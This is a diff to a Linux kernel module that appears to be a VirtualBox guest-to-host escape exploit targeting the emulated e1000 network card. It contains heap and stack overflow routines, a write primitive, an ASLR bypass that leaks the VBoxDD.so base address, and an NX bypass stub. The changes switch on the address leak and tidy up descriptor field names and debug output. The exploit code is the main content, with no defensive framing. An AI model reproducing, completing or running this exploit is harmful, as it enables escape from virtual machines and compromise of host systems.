@@ -26,7 +26,7 @@ MODULE_LICENSE("TLS-SEC");
 /* ========================== METHOD DECLARATION ========================== */
 static int __init e1k_init(void);
 static void __exit e1k_exit(void);
-static uint8_t* map_mmio(void);
+static uint8_t * map_mmio(void);
 static void e1k_configure(void);
 static void heap_overflow(uint16_t new_addr);
 static void write_primitive(uint16_t address, uint16_t value);
@@ -35,8 +35,8 @@ static void stack_overflow(void);
 static void nx_bypass(void);
 
 /* ==================== GLOBAL VARIABLES DECLARATION ====================== */
-uint8_t* bar0, tx_buffer;
-struct e1000_desc* tx_ring;
+uint8_t * bar0, * tx_buffer;
+struct e1000_desc * tx_ring;
 static int	idx = 0;
 uint16_t mu16Data[64] =
 {	0x0008, 0x1527, 0x2049, 0x0000, 0xffff, 0x0000, 0x0000, 0x0000,
@@ -53,13 +53,16 @@ uint16_t mu16Data[64] =
 /* ------------------------------ Constructor ----------------------------- */
 static int __init e1k_init(void)
 {
+	uint64_t res; 
+
 	bar0 = map_mmio();
 	if (!bar0) {
 		pr_info("e1k : failed to map mmio");
 		return -1;
 	}
 	e1k_configure();
-	//aslr_bypass();
+	res = aslr_bypass();
+	pr_info("Leaked VBoxDD.so base : 0x%016llx\n", vboxdd_base);
 	//nx_bypass();
 	
 	pr_info("Pwnd");
@@ -79,7 +82,7 @@ module_exit(e1k_exit);
 /** map_mmio : get virtual address mapped to device physical address
  * @return virtual address of 0xF0000000
  */
-static uint8_t* map_mmio(void)
+static uint8_t * map_mmio(void)
 {
 	off_t phys_addr = 0xF0000000;
 	size_t length = 0x20000;
@@ -124,13 +127,13 @@ static void e1k_configure(void)
 		return;
 	}
 	// Payload setup
-	for (i = 0; i < PAYLOAD_LEN-(0x32); ++i) {
+	for (i = 0; i < PAYLOAD_LEN-50; ++i) {
 		tx_buffer[i] = 0x61; // Fill with garbage "a"
 	}
 
 	tdba = (uint64_t)((uintptr_t) virt_to_phys(tx_ring));
 	set_register(TDBAL, (uint32_t) ((tdba & 0xFFFFFFFFULL)));
-	pr_info("¯\\_(ツ)_/¯");
+	//pr_info("¯\\_(ツ)_/¯");
 	set_register(TDBAH, (uint32_t) (tdba >> 32));
 
 	tdlen = DESC_SIZE * NB_MAX_DESC;
@@ -151,10 +154,10 @@ static void heap_overflow(uint16_t new_addr)
 	uint32_t	tdt;
 	uint64_t 	physical_address;
 
-	struct e1000_ctxt_desc*	ctxt_1 = &(tx_ring[idx+0].context);
+	struct e1000_ctxt_desc*	ctxt_1 = &(tx_ring[idx+0].ctxt);
 	struct e1000_data_desc*	data_2 = &(tx_ring[idx+1].data);
 	struct e1000_data_desc*	data_3 = &(tx_ring[idx+2].data);
-	struct e1000_ctxt_desc*	ctxt_4 = &(tx_ring[idx+3].context);
+	struct e1000_ctxt_desc*	ctxt_4 = &(tx_ring[idx+3].ctxt);
 	struct e1000_data_desc*	data_5 = &(tx_ring[idx+4].data);
 
 	//------------- Payload setup -------------//
@@ -333,14 +336,13 @@ static uint64_t aslr_bypass(void)
 	for (i = 0; i < 8; i++) {
 		write_primitive(0x266f, 0x0058 + 0x2A + 0x8 + i);
 		leaked_bytes[i] = inb(0x4107);
-
-		pr_info("Byte %d leaked: 0x%02X\n", i, leaked_bytes[i]);
+		//pr_info("Byte %d leaked: 0x%02X\n", i, leaked_bytes[i]);
 	}
 
 	leaked_vboxdd_ptr	= *((uint64_t *) leaked_bytes);
 	vboxdd_base			= leaked_vboxdd_ptr - LEAKED_VBOXDD_VAO;
-	pr_info("Leaked VBoxDD.so pointer : 0x%016llx\n", leaked_vboxdd_ptr);
-	pr_info("Leaked VBoxDD.so base : 0x%016llx\n", vboxdd_base);
+	//pr_info("Leaked VBoxDD.so pointer : 0x%016llx\n", leaked_vboxdd_ptr);
+	//pr_info("Leaked VBoxDD.so base : 0x%016llx\n", vboxdd_base);
 
 	return vboxdd_base;
 }
@@ -351,10 +353,10 @@ static void stack_overflow(void)
 	uint32_t	tdt;
 	uint64_t 	physical_address;
 
-	struct e1000_ctxt_desc*	ctxt_1 = &(tx_ring[idx+0].context);
+	struct e1000_ctxt_desc*	ctxt_1 = &(tx_ring[idx+0].ctxt);
 	struct e1000_data_desc*	data_2 = &(tx_ring[idx+1].data);
 	struct e1000_data_desc*	data_3 = &(tx_ring[idx+2].data);
-	struct e1000_ctxt_desc*	ctxt_4 = &(tx_ring[idx+3].context);
+	struct e1000_ctxt_desc*	ctxt_4 = &(tx_ring[idx+3].ctxt);
 	struct e1000_data_desc*	data_5 = &(tx_ring[idx+4].data);
 
 	//------------- Payload setup -------------//
